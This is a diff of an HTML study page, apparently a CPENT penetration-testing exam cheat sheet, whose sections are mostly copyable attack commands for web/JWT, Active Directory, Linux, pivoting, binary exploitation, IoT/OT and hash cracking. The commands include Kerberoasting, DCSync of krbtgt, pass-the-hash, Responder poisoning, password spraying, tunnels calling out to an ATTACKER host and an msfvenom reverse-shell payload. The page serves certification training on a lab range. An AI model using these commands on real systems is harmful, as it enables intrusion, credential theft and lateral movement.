+    <p class="atk-note">Nikto for a fast misconfiguration sweep; WPScan when WordPress is in scope, to enumerate users and vulnerable plugins.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nikto -h https://target
+wpscan --url https://target --enumerate u,vp</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">IDOR / BOLA</p>
+    <p class="atk-note">Iterate object IDs while authenticated as a low-privilege user. A 200 on another user&rsquo;s object is broken object-level authorization.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>ffuf -u https://target/api/v1/users/FUZZ/orders -w ids.txt \
+     -H "Authorization: Bearer &lt;low-priv-token&gt;" -mc 200</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">JWT &mdash; alg:none bypass</p>
+    <p class="atk-note">Strip the signature and set the algorithm to none. If the server accepts it, you forge any claim.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>jwt_tool &lt;token&gt;                        <span class="cm"># decode header / payload</span>
+jwt_tool &lt;token&gt; -X a                    <span class="cm"># alg:none attack</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">JWT &mdash; weak secret &amp; algorithm confusion</p>
+    <p class="atk-note">Crack a weak HS256 secret, then forge admin claims; or sign RS256 with the public key as an HMAC key when the server confuses the two.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>jwt_tool &lt;token&gt; -C -d wordlist.txt      <span class="cm"># brute the HS256 secret</span>
+hashcat -m 16500 jwt.txt rockyou.txt     <span class="cm"># crack the signing key</span>
+jwt_tool &lt;token&gt; -X k -pk public.pem     <span class="cm"># RS256 -&gt; HMAC key confusion</span></pre></div>
   </div>
 </section>
 
-<!-- 08 -->
+<!-- 08 AD -->
 <section class="sec" id="s8">
-  <div class="sec-h"><span class="n">08</span><h2>Windows &amp; Active Directory</h2></div>
-  <p>The densest scoring ground on the range. Local privilege escalation gets you SYSTEM on a box; AD attacks get you the domain. Enumerate first, then take the shortest path.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">windows local privilege escalation</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre>whoami /priv                              <span class="cm"># the whole game is in here</span>
-winPEASx64.exe quiet                      <span class="cm"># or PowerUp Invoke-AllChecks</span>
+  <div class="sec-h"><span class="n">08</span><h2>Active Directory &amp; Windows</h2></div>
+  <p>The densest scoring ground. Map the domain, roast for credentials, move laterally, dump, then escalate. Enumerate before you commit to a path.</p>
 
-<span class="cm"># SeImpersonate / SeAssignPrimaryToken -&gt; SYSTEM</span>
-PrintSpoofer.exe -i -c cmd
-GodPotato -cmd "cmd /c whoami"            <span class="cm"># modern potato, 2019 / 2022</span>
-
-<span class="cm"># Also: unquoted service paths, weak service perms, AlwaysInstallElevated</span></pre>
+  <div class="atk">
+    <p class="atk-name">Map the AD network</p>
+    <p class="atk-note">Collect with BloodHound / SharpHound and read the shortest path to Domain Admin off the graph. Do not guess it.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>bloodhound-python -u user -p pass -d corp.local -c all -ns 10.10.10.5
+<span class="cm"># or on-host:</span> SharpHound.exe -c All
+enum4linux-ng -A 10.10.10.5             <span class="cm"># users, groups, shares</span></pre></div>
   </div>
-  <div class="code">
-    <div class="code-top"><span class="code-label">AD enumeration &amp; attacks</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># Map the domain, then read the shortest path in BloodHound</span>
-bloodhound-python -u user -p pass -d corp.local -c all -ns 10.10.10.5
-<span class="cm"># or on-host: SharpHound.exe -c All</span>
 
-<span class="cm"># Kerberoast: service accounts with SPNs -&gt; crackable TGS</span>
-impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.5 -request
-hashcat -m 13100 tgs.txt rockyou.txt
-
-<span class="cm"># AS-REP roast: accounts without pre-auth</span>
-impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass
-hashcat -m 18200 asrep.txt rockyou.txt
-
-<span class="cm"># Move &amp; dump once you have a hash or password</span>
-impacket-secretsdump corp.local/user:pass@10.10.10.5
-evil-winrm -i 10.10.10.5 -u admin -H &lt;NTLM-hash&gt;   <span class="cm"># pass-the-hash</span>
-impacket-psexec corp.local/admin@10.10.10.5 -hashes :&lt;NTLM&gt;</pre>
+  <div class="atk">
+    <p class="atk-name">Credential sweep &amp; password spray</p>
+    <p class="atk-note">Test one credential across the domain to find where it is local admin. Spraying counts as real logons, so watch lockout thresholds.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nxc smb 10.10.10.0/24 -u user -p 'Pass123' --shares
+kerbrute passwordspray -d corp.local users.txt 'Spring2026!'</pre></div>
   </div>
-  <div class="tbl-wrap"><table>
-    <thead><tr><th>Attack</th><th>Precondition</th><th class="mono">hashcat</th></tr></thead>
-    <tbody>
-    <tr><td>Kerberoasting</td><td>Any domain user; the target has an SPN</td><td class="mono">13100</td></tr>
-    <tr><td>AS-REP roasting</td><td>Account with pre-auth disabled</td><td class="mono">18200</td></tr>
-    <tr><td>NTLMv2 capture</td><td>Responder / relay on the segment</td><td class="mono">5600</td></tr>
-    <tr><td>DCSync</td><td>Replication rights, often via ACL abuse</td><td class="mono">secretsdump</td></tr>
-    </tbody>
-  </table></div>
+
+  <div class="atk">
+    <p class="atk-name">Kerberoasting</p>
+    <p class="atk-note">Any domain user can request the service ticket of an account with an SPN, then crack it offline. hashcat mode 13100.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.5 -request
+hashcat -m 13100 tgs.txt rockyou.txt</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">AS-REP roasting</p>
+    <p class="atk-note">Accounts with Kerberos pre-authentication disabled hand out a crackable hash without any credential. hashcat mode 18200.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass
+hashcat -m 18200 asrep.txt rockyou.txt</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">NTLM capture &amp; poisoning</p>
+    <p class="atk-note">Responder poisons LLMNR / NBT-NS and captures NetNTLMv2 hashes off the wire. Crack with hashcat mode 5600 (or relay them).</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>responder -I eth0 -wv
+hashcat -m 5600 ntlmv2.txt rockyou.txt</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Lateral movement</p>
+    <p class="atk-note">Turn a password or NTLM hash into execution on the next host. Pass-the-hash with <code>-H</code> needs no cleartext password.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>impacket-psexec corp.local/admin@10.10.10.6 -hashes :&lt;NTLM&gt;
+impacket-wmiexec corp.local/admin:pass@10.10.10.6
+evil-winrm -i 10.10.10.6 -u admin -H &lt;NTLM-hash&gt;   <span class="cm"># pass-the-hash</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Credential dumping &amp; DCSync</p>
+    <p class="atk-note">secretsdump pulls local and domain secrets. With replication rights (often via an ACL abuse) DCSync pulls any hash, including krbtgt.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>impacket-secretsdump corp.local/user:pass@10.10.10.5
+impacket-secretsdump corp.local/user:pass@10.10.10.5 -just-dc-user krbtgt</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Windows local privilege escalation</p>
+    <p class="atk-note">Read your token privileges first. <code>SeImpersonate</code> (common on service accounts) means a potato gets you SYSTEM.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>whoami /priv
+winPEASx64.exe quiet                     <span class="cm"># or PowerUp Invoke-AllChecks</span>
+PrintSpoofer.exe -i -c cmd               <span class="cm"># SeImpersonate -&gt; SYSTEM</span>
+GodPotato -cmd "cmd /c whoami"           <span class="cm"># modern potato, 2019 / 2022</span></pre></div>
+  </div>
 </section>
 
-<!-- 09 -->
+<!-- 09 LINUX -->
 <section class="sec" id="s9">
-  <div class="sec-h"><span class="n">09</span><h2>Linux exploitation &amp; privilege escalation</h2></div>
-  <p>Run the enumerator, then work the five classic vectors: sudo rules, SUID binaries, capabilities, cron, and writable paths. GTFOBins turns almost any of them into a root shell.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">linux privesc checklist</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre>./linpeas.sh -a | tee linpeas.txt
+  <div class="sec-h"><span class="n">09</span><h2>Linux privilege escalation</h2></div>
+  <p>Run the enumerator, then work the five classic vectors. GTFOBins turns almost any of them into a root shell.</p>
 
-sudo -l                                   <span class="cm"># NOPASSWD entries -&gt; GTFOBins</span>
-find / -perm -4000 -type f 2&gt;/dev/null    <span class="cm"># SUID binaries</span>
-getcap -r / 2&gt;/dev/null                    <span class="cm"># cap_setuid=ep is game over</span>
-cat /etc/crontab; ls -la /etc/cron.*      <span class="cm"># writable script run as root</span>
-
-<span class="cm"># Examples via GTFOBins</span>
-sudo find . -exec /bin/sh \; -quit        <span class="cm"># if sudo find is allowed</span></pre>
+  <div class="atk">
+    <p class="atk-name">Enumerate everything</p>
+    <p class="atk-note">One command surfaces sudo rules, SUID, capabilities, cron and kernel version. Read it, then pick a vector below.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>./linpeas.sh -a | tee linpeas.txt</pre></div>
   </div>
-  <p>Memorise the workflow, not the exploits: run linpeas, note anything unusual, look it up on GTFOBins, get root. Kernel exploits such as DirtyPipe or PwnKit are a fallback when the configuration is clean, not a first move; they are noisy and can crash the box.</p>
+
+  <div class="atk">
+    <p class="atk-name">Abuse sudo rights</p>
+    <p class="atk-note">List what you may run as root, then check GTFOBins for a shell escape. NOPASSWD entries are the fast win.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>sudo -l
+sudo find . -exec /bin/sh \; -quit       <span class="cm"># example if sudo find is allowed</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">SUID binaries &amp; capabilities</p>
+    <p class="atk-note">A root-owned SUID binary or a <code>cap_setuid</code> capability on the wrong binary is a direct route to root via GTFOBins.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>find / -perm -4000 -type f 2&gt;/dev/null    <span class="cm"># SUID binaries</span>
+getcap -r / 2&gt;/dev/null                    <span class="cm"># cap_setuid=ep is game over</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Writable cron &amp; kernel fallback</p>
+    <p class="atk-note">A world-writable script run by root cron is easy privesc. Kernel exploits (DirtyPipe, PwnKit) are a last resort; they are noisy and can crash the box.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>cat /etc/crontab; ls -la /etc/cron.*
+searchsploit "linux kernel $(uname -r | cut -d- -f1)"</pre></div>
+  </div>
 </section>
 
-<!-- 10 -->
+<!-- 10 PIVOTING -->
 <section class="sec" id="s10">
-  <div class="sec-h"><span class="n">10</span><h2>Pivoting, tunnelling &amp; the double pivot</h2></div>
-  <p>This is what makes CPENT CPENT. Hidden segments sit behind compromised hosts, and the highest-value flags live there. The <strong>double pivot</strong> &mdash; routing through two chained hosts to reach a third network &mdash; is a signature exam skill. Practise it until it is cold.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">ssh &amp; proxychains</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># Dynamic SOCKS proxy through a foothold (single pivot)</span>
-ssh -D 1080 -N user@10.10.10.5           <span class="cm"># then set socks5 127.0.0.1 1080</span>
-proxychains nmap -sT -Pn 172.16.5.0/24   <span class="cm"># scan the hidden net</span>
+  <div class="sec-h"><span class="n">10</span><h2>Pivoting &amp; tunnelling</h2></div>
+  <p>The skill that makes CPENT CPENT. Hidden segments sit behind compromised hosts, and the highest-value flags live there. Over-invest here.</p>
 
-<span class="cm"># Local / remote forwards for a single port</span>
-ssh -L 8000:172.16.5.10:80 user@10.10.10.5   <span class="cm"># reach their :80 locally</span>
-ssh -R 9001:127.0.0.1:9001 user@10.10.10.5   <span class="cm"># pull a callback back to you</span></pre>
+  <div class="atk">
+    <p class="atk-name">Dynamic SOCKS (single pivot)</p>
+    <p class="atk-note">Open a SOCKS proxy through a foothold, then run any TCP tool through it with proxychains. proxychains is TCP-connect only, no UDP or raw.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>ssh -D 1080 -N user@10.10.10.5           <span class="cm"># socks5 127.0.0.1 1080</span>
+proxychains nmap -sT -Pn 172.16.5.0/24   <span class="cm"># scan the hidden net</span></pre></div>
   </div>
-  <div class="code">
-    <div class="code-top"><span class="code-label">chisel &amp; ligolo-ng</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># chisel reverse SOCKS: attacker = server, pivot host = client</span>
-<span class="pr">attacker&gt;</span> chisel server -p 8080 --reverse
-<span class="pr">pivot&gt;</span>    chisel client ATTACKER:8080 R:socks
 
-<span class="cm"># ligolo-ng: clean tun interface, best for double pivots</span>
-<span class="pr">attacker&gt;</span> ./proxy -selfcert
+  <div class="atk">
+    <p class="atk-name">Local &amp; remote port forwarding</p>
+    <p class="atk-note">Forward a single port when you only need one service. <code>-L</code> reaches into their network; <code>-R</code> pulls a callback back to you.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>ssh -L 8000:172.16.5.10:80 user@10.10.10.5   <span class="cm"># reach their :80 locally</span>
+ssh -R 9001:127.0.0.1:9001 user@10.10.10.5   <span class="cm"># callback back to you</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">SOCKS over HTTP (chisel)</p>
+    <p class="atk-note">When only HTTP egress is allowed, chisel tunnels a reverse SOCKS proxy over it. Attacker is the server, the pivot host is the client.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre><span class="pr">attacker&gt;</span> chisel server -p 8080 --reverse
+<span class="pr">pivot&gt;</span>    chisel client ATTACKER:8080 R:socks</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">tun interface &amp; the double pivot (ligolo-ng)</p>
+    <p class="atk-note">ligolo-ng gives a clean tun interface and is the easiest way to hold several segments. Add a route per network; repeat the agent on the second host to double-pivot into network C.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre><span class="pr">attacker&gt;</span> ./proxy -selfcert
 <span class="pr">pivot1&gt;</span>   ./agent -connect ATTACKER:11601 -ignore-cert
-<span class="cm"># add a route to the hidden net, then repeat the agent on pivot2</span>
-sudo ip route add 172.16.5.0/24 dev ligolo</pre>
+sudo ip route add 172.16.5.0/24 dev ligolo
+<span class="cm"># repeat ./agent on a host in 172.16.5.0/24 to reach the next network</span></pre></div>
   </div>
-  <div class="callout key">
-    <div class="cl-label">The double pivot, in one sentence</div>
-    <p>Compromise host A (reachable), tunnel through it to reach host B on a second network, compromise B, then start a second tunnel through B to reach network C. ligolo-ng handles this cleanly by adding a route per segment; with SSH you nest a second <code>-D</code> through the first proxy; Metasploit does it with <code>autoroute</code> plus a second <code>socks_proxy</code>. See the full <a class="inl" href="/pivoting.html">pivoting &amp; tunnelling lab</a>.</p>
+
+  <div class="atk">
+    <p class="atk-name">Metasploit route</p>
+    <p class="atk-note">Inside a Meterpreter session, autoroute plus a SOCKS proxy does the same for the framework&rsquo;s modules.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>meterpreter&gt; run autoroute -s 172.16.5.0/24
+msf&gt; use auxiliary/server/socks_proxy</pre></div>
   </div>
 </section>
 
-<!-- 11 -->
+<!-- 11 BINARIES -->
 <section class="sec" id="s11">
-  <div class="sec-h"><span class="n">11</span><h2>Reverse engineering &amp; binary exploitation</h2></div>
-  <p>The module that scares people. You are not asked to write research-grade exploits. You are asked to drive the classic <strong>stack buffer overflow</strong> to completion, on both 32 and 64-bit targets, under time pressure. Know the workflow as a reflex.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">the stack overflow workflow</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># 0. Triage the binary</span>
-checksec --file=./vuln          <span class="cm"># NX? PIE? canary? RELRO?</span>
+  <div class="sec-h"><span class="n">11</span><h2>Binary exploitation</h2></div>
+  <p>The bar is competence, not research. Drive the classic stack overflow to completion on both 32 and 64-bit. Each step is a command.</p>
 
-<span class="cm"># 1. Crash it, then find the exact offset to EIP / RIP</span>
-msf-pattern_create -l 2000
-msf-pattern_offset -q 39694438  <span class="cm"># the value that landed in EIP</span>
-
-<span class="cm"># 2. Confirm control: offset*'A' + 'BBBB' -&gt; EIP = 0x42424242</span>
-<span class="cm"># 3. Find bad chars (compare sent vs memory), then a JMP ESP</span>
-!mona jmp -r esp -cpb '\x00\x0a'   <span class="cm"># Immunity / WinDbg + mona.py</span>
-
-<span class="cm"># 4. Generate shellcode avoiding the bad chars</span>
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 \
-         -b '\x00\x0a\x0d' -f python -v shellcode
-
-<span class="cm"># 5. Payload = offset*'A' + JMP_ESP_addr + NOPs + shellcode</span></pre>
+  <div class="atk">
+    <p class="atk-name">Triage the binary</p>
+    <p class="atk-note">Check protections first: NX, PIE, canary and RELRO decide which technique you need.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>checksec --file=./vuln</pre></div>
   </div>
+
+  <div class="atk">
+    <p class="atk-name">Debug &amp; reverse</p>
+    <p class="atk-note">GDB with pwndbg or GEF for dynamic analysis, Ghidra for static reversing, strace / ltrace to watch syscalls and library calls.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>gdb ./vuln                     <span class="cm"># with pwndbg or GEF loaded</span>
+ghidra                         <span class="cm"># static reverse engineering</span>
+strace ./vuln ; ltrace ./vuln</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Find the offset to EIP / RIP</p>
+    <p class="atk-note">Send a cyclic pattern, crash the target, then resolve the exact offset from the value that landed in the instruction pointer.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>msf-pattern_create -l 2000
+msf-pattern_offset -q 39694438   <span class="cm"># value seen in EIP/RIP</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Bad characters &amp; a JMP ESP / RSP</p>
+    <p class="atk-note">Find bytes that corrupt the payload, then a jump-to-stack gadget that avoids them. On 64-bit the register is RSP.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>!mona bytearray -cpb '\x00'              <span class="cm"># generate, then compare in memory</span>
+!mona jmp -r esp -cpb '\x00\x0a'        <span class="cm"># find JMP ESP (RSP on x64)</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Generate shellcode</p>
+    <p class="atk-note">Build a reverse shell that avoids the bad characters, then assemble: offset padding + jump gadget + NOP sled + shellcode.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 \
+         -b '\x00\x0a\x0d' -f python -v shellcode</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Defeat NX / DEP with ROP, and script it</p>
+    <p class="atk-note">When the stack is non-executable, chain gadgets into a short ROP to <code>system()</code> or a ret2libc. pwntools turns the whole flow into a repeatable script.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>ROPgadget --binary ./vuln --only "pop|ret"
+python3 -c 'from pwn import *; ...'      <span class="cm"># pwntools exploit template</span></pre></div>
+  </div>
+</section>
+
+<!-- 12 IOT/OT -->
+<section class="sec" id="s12">
+  <div class="sec-h"><span class="n">12</span><h2>IoT, firmware &amp; OT</h2></div>
+  <p>Enumeration beats brute force. The wins are usually secrets left in the firmware image. On OT, identify only.</p>
+
+  <div class="atk">
+    <p class="atk-name">Carve the firmware</p>
+    <p class="atk-note">binwalk finds and extracts embedded filesystems and compressed blobs from a firmware image.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>binwalk -e firmware.bin</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Extract the filesystem</p>
+    <p class="atk-note">Unpack SquashFS with unsquashfs; keep sasquatch for vendor firmware whose non-standard SquashFS chokes the stock tool.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>unsquashfs squashfs-root.bin
+sasquatch squashfs-root.bin              <span class="cm"># non-standard SquashFS variants</span></pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Hunt for secrets</p>
+    <p class="atk-note">firmwalker sweeps the extracted filesystem for passwd / shadow files, SSH keys, certs and hardcoded credentials.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>firmwalker.sh _firmware.extracted/
+strings -n 8 firmware.bin | grep -iE 'pass|key|token'</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">MQTT (1883)</p>
+    <p class="atk-note">IoT brokers are frequently unauthenticated. Subscribe to the wildcard topic and read the device&rsquo;s whole conversation.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>mosquitto_sub -h 10.10.10.5 -t '#' -v</pre></div>
+  </div>
+
+  <div class="atk">
+    <p class="atk-name">Modbus / OT &mdash; identify only</p>
+    <p class="atk-note">Modbus/TCP (502) has no auth or encryption, so identification is the whole game. Enumerate and prove access; never fuzz or flood, because an aggressive scan can halt a physical process.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>nmap -p 502 --script modbus-discover 10.10.10.5
+nmap -p 102 --script s7-info 10.10.10.5</pre></div>
+  </div>
+</section>
+
+<!-- 13 CRACKING -->
+<section class="sec" id="s13">
+  <div class="sec-h"><span class="n">13</span><h2>Hash cracking</h2></div>
+  <p>Every roast, capture and dump above ends in a hash. Know the hashcat mode for each on sight.</p>
   <div class="tbl-wrap"><table>
-    <thead><tr><th>Protection</th><th>What it stops</th><th>Range-realistic answer</th></tr></thead>
+    <thead><tr><th>Hash / source</th><th>Where it comes from</th><th class="mono">hashcat -m</th></tr></thead>
     <tbody>
-    <tr><td>NX / DEP</td><td>Executing shellcode on the stack</td><td>Ret2libc or a short ROP chain to <code>system()</code></td></tr>
-    <tr><td>ASLR</td><td>Hardcoding addresses</td><td>Leak an address first, or brute a non-PIE 32-bit base</td></tr>
-    <tr><td>Stack canary</td><td>Overwriting the return address blindly</td><td>Leak the canary via a format string, then keep it intact</td></tr>
+    <tr><td>NTLM</td><td>secretsdump, SAM, NTDS</td><td class="mono">1000</td></tr>
+    <tr><td>NetNTLMv2</td><td>Responder capture</td><td class="mono">5600</td></tr>
+    <tr><td>Kerberoast (TGS-REP)</td><td>GetUserSPNs</td><td class="mono">13100</td></tr>
+    <tr><td>AS-REP</td><td>GetNPUsers</td><td class="mono">18200</td></tr>
+    <tr><td>JWT (HMAC)</td><td>web / API token</td><td class="mono">16500</td></tr>
+    <tr><td>sha512crypt ($6$)</td><td>Linux /etc/shadow</td><td class="mono">1800</td></tr>
+    <tr><td>bcrypt ($2*$)</td><td>app databases</td><td class="mono">3200</td></tr>
     </tbody>
   </table></div>
-  <p>Tooling: <strong>gdb</strong> with pwndbg or GEF for dynamic analysis, <strong>Ghidra</strong> for static reversing, <strong>mona.py</strong> in Immunity or WinDbg for offset and gadget hunting. For scripted exploits, <code>pwntools</code> turns the five steps above into a dozen lines of Python.</p>
-</section>
-
-<!-- 12 -->
-<section class="sec" id="s12">
-  <div class="sec-h"><span class="n">12</span><h2>IoT &amp; OT / SCADA</h2></div>
-  <p>IoT is a named module; operational technology is an advanced range skill. Both reward careful enumeration over brute force, and OT especially demands a light touch: these are systems that move physical things.</p>
-  <div class="code">
-    <div class="code-top"><span class="code-label">firmware &amp; IoT protocols</span><button class="copy" onclick="cp(this)">Copy</button></div>
-<pre><span class="cm"># Firmware: extract and hunt for secrets</span>
-binwalk -e firmware.bin                 <span class="cm"># carve the filesystem</span>
-strings -n 8 firmware.bin | grep -i -E 'pass|key|token'
-grep -rE '(BEGIN RSA|admin:)' _firmware.extracted/
-
-<span class="cm"># MQTT (1883) — often unauthenticated on IoT</span>
-mosquitto_sub -h 10.10.10.5 -t '#' -v   <span class="cm"># subscribe to everything</span>
-
-<span class="cm"># OT / SCADA — identify only, do not disrupt</span>
-nmap -p 502 --script modbus-discover 10.10.10.5
-nmap -p 102 --script s7-info 10.10.10.5</pre>
-  </div>
-  <div class="callout key">
-    <div class="cl-label">OT safety mindset</div>
-    <p>On operational technology you enumerate and prove access; you do not fuzz or flood. In the real world an aggressive scan can halt a PLC and a physical process. CPENT tests whether you know the difference between a controlled test and a reckless one, so treat OT targets as read-first, write-never unless the objective explicitly calls for it.</p>
+  <div class="atk">
+    <p class="atk-name">Run the crack</p>
+    <p class="atk-note">hashcat with the right mode and a wordlist, or John with autodetect. Add a rule set (best64) before you reach for brute force.</p>
+    <div class="cmd"><button class="copy" onclick="cp(this)">Copy</button>
+<pre>hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+john --wordlist=rockyou.txt hashes.txt</pre></div>
   </div>
 </section>
 
 <p class="part">Part IV &mdash; Finishing the exam</p>
 
-<!-- 13 -->
-<section class="sec" id="s13">
-  <div class="sec-h"><span class="n">13</span><h2>Report writing &amp; submission</h2></div>
-  <p>The exam is not over when the range closes. You have <strong>seven days</strong> to submit a professional penetration test report, and it counts toward your score. Treat it as a deliverable a client would pay for, because in the LPT world that is exactly the point.</p>
+<!-- 14 REPORT -->
+<section class="sec" id="s14">
+  <div class="sec-h"><span class="n">14</span><h2>Report writing &amp; submission</h2></div>
+  <p>The exam is not over when the range closes. You have <strong>seven days</strong> to submit a professional report, and it is scored. Treat it as a deliverable a client would pay for.</p>
   <div class="tbl-wrap"><table>
     <thead><tr><th>Section</th><th>What graders look for</th></tr></thead>
     <tbody>
@@ -704,40 +866,43 @@ nmap -p 102 --script s7-info 10.10.10.5</pre>
     <tr><td>Remediation</td><td>Specific, actionable fixes per finding. Not &ldquo;patch everything&rdquo;.</td></tr>
     </tbody>
   </table></div>
-  <p>Every screenshot should show the target IP, your command and the result in one frame. A flag string with no context is weak proof. This is why the <a class="inl" href="#s4">time plan</a> ends each session with an evidence-lock window: reconstructing proofs from memory after the range closes is where scores quietly leak away.</p>
+  <p>Every screenshot should show the target IP, your command and the result in one frame. Feed the report continuously during the exam. Reconstructing proofs from memory at hour twenty-three is where scores quietly leak away.</p>
 </section>
 
-<!-- 14 -->
-<section class="sec" id="s14">
-  <div class="sec-h"><span class="n">14</span><h2>CPENT exam FAQ</h2></div>
+<!-- 15 FAQ -->
+<section class="sec" id="s15">
+  <div class="sec-h"><span class="n">15</span><h2>CPENT exam FAQ</h2></div>
   <h3>How long is the CPENT exam and how is it scored?</h3>
-  <p>It is a fully practical exam on a live cyber range. You choose one continuous 24-hour session or two 12-hour sessions. Score <strong>70%+</strong> for the CPENT certification and <strong>90%+</strong> to also earn the Licensed Penetration Tester (LPT) Master credential. You then submit a professional report within seven days of your final session, and that report is scored too.</p>
+  <p>A fully practical exam on a live cyber range. You choose one 24-hour session or two of 12 hours. Score <strong>70%+</strong> for the CPENT certification and <strong>90%+</strong> to also earn Licensed Penetration Tester (LPT) Master. You then submit a professional report within seven days, and that report is scored too.</p>
   <h3>Is the CPENT exam open book?</h3>
-  <p>Yes. It is a hands-on range, so your own notes, cheat sheets and standard tools are allowed; outside help is not. The advantage of a reference like this is speed. On a 24-hour clock, the tester who does not stop to look up an <code>msfvenom</code> flag or a Kerberoasting one-liner simply finishes more challenges.</p>
+  <p>Yes. It is a hands-on range, so your own notes, cheat sheets and standard tools are allowed; outside help is not. The advantage of a reference like this is speed: not stopping to look up an <code>msfvenom</code> flag or a Kerberoasting one-liner lets you finish more challenges.</p>
   <h3>What is CPENT AI, and how is it different from the older CPENT?</h3>
-  <p>CPENT AI is the current version. It keeps the same 24-hour practical exam and LPT Master pathway, and layers in AI-assisted techniques across the phases: AI for reconnaissance, vulnerability analysis, exploit suggestion and Active Directory enumeration. The core skills the range grades are unchanged.</p>
+  <p>CPENT AI is the current version. Same 24-hour practical exam and LPT Master pathway, plus AI-assisted techniques across the phases. The core skills the range grades are unchanged.</p>
   <h3>What is the hardest part of the CPENT exam?</h3>
-  <p>For most candidates it is pivoting into hidden segments combined with binary exploitation under time pressure. The range is chained, so a foothold on one host is the only route to a network behind it, and a failed pivot blocks everything past it. Practising double pivoting and 32 and 64-bit stack overflows until they are automatic is what separates a pass from an LPT Master score.</p>
-  <h3>What is Hackers 4 Humanity, and how does it relate to CPENT?</h3>
-  <p>It is an EC-Council initiative offering experienced pen testers a fully sponsored CPENT AI exam. For each professional who passes, EC-Council donates $1,000 of cybersecurity training to underprivileged learners through non-profit partners. Score 90%+ and you are recognised as one of the 1,000 Great Pen Testers of 2026 at Hacker Halted. Nominations run from May to early October 2026.</p>
+  <p>Pivoting into hidden segments combined with binary exploitation under time pressure. The range is chained, so a failed pivot blocks everything behind it. Drill double pivoting and 32 and 64-bit stack overflows until they are automatic.</p>
   <h3>Do I need exploit development skills to pass CPENT?</h3>
